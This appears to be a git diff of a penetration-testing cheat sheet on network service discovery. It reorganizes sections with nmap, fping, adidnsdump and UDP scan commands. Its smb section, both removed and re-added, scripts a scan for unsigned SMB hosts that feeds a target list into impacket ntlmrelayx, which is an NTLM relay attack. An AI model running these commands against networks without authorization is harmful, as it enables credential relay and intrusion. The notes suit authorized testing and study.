@@ -15,13 +15,12 @@ tags: discovery scan nmap TA0007 T1595 T1046
 
 **Menu**
 <!-- vscode-markdown-toc -->
-* [adm-svc](#adm-svc)
-* [WinRM / SMB / RPC](#WinRMSMBRPC)
-	* [winrm](#winrm)
-	* [smb](#smb)
+* [dns](#dns)
 * [icmp](#icmp)
+* [smb](#smb)
 * [tcp](#tcp)
 * [udp](#udp)
+* [winrm](#winrm)
 * [theory](#theory)
 	* [NMAP Note 0 : Default Behavior](#NMAPNote0:DefaultBehavior)
 	* [NMAP Note 1 : UDP conns](#NMAPNote1:UDPconns)
@@ -41,20 +40,9 @@ tags: discovery scan nmap TA0007 T1595 T1046
 
 ![](/assets/images/pen-ta0007-discov-t1046-scan-net-svc.png)
 
-## <a name='winrm'></a>winrm
-
-- [WinRM nmap script](https://github.com/RicterZ/My-NSE-Scripts/blob/master/scripts/winrm.nse)
-
-## <a name='smb'></a>smb
-
-SMBv2: SIGNING NOT REQUIRED
+## <a name='dns'></a>dns
 ```sh
-# STEP 1: find smb not signed
-nmap -p 445 --script smb2-security-mode 10.0.0.0/24 -o output.txt
-
-# STEP 2: set up impacket/ntlmrelayx
-grep -B 9 "not required" output.txt |sed -E '/.*\((.*\..*\..*\..*)\)$/!d' |sed -E 's/.*\((.*\..*\..*\..*)\)$/\1/' > targets.txt
-python3 ntlmrelayx.py -tf targets.txt -smb2support
+adidnsdump -u $zdom_fqdn\$ztarg_user_name -p $ztarg_user_pass $zdom_dc_fqdn
 ```
 
 ## <a name='icmp'></a>icmp
@@ -74,6 +62,16 @@ fping -g 192.168.1.0/24
 # PING an IP range w/ NMAP and save results to hosts_up file
 # Send ICMP timestamp & netmask requests w/ no port scan and no IP reverse lookup 
 nmap -PEPM -sP -n -oA hosts_up 192.168.1.0/24 
+```
+
+## <a name='smb'></a>smb
+```sh
+# STEP 1: find smb not signed
+nmap -p 445 --script smb2-security-mode 10.0.0.0/24 -o output.txt
+
+# STEP 2: set up impacket/ntlmrelayx
+grep -B 9 "not required" output.txt |sed -E '/.*\((.*\..*\..*\..*)\)$/!d' |sed -E 's/.*\((.*\..*\..*\..*)\)$/\1/' > targets.txt
+python3 ntlmrelayx.py -tf targets.txt -smb2support
 ```
 
 ## <a name='tcp'></a>tcp
@@ -107,6 +105,10 @@ nmap -sU -Pn -oA nmap_udp_top1000_scan -iL hosts_up
 sudo nmap -sU -Pn -p0- --reason --stats-every 60s --max-rtt-timeout=50ms --max-retries=1 -oA nmap_udp_fullscan 192.168.0.0/24
 sudo nmap -sU -Pn -p0- --reason --stats-every 60s --max-rtt-timeout=50ms --max-retries=1 -oA nmap_udp_fullscan -iL hosts_up
 ```
+
+## <a name='winrm'></a>winrm
+- [WinRM nmap script](https://github.com/RicterZ/My-NSE-Scripts/blob/master/scripts/winrm.nse)
+
 
 ## <a name='theory'></a>theory
 
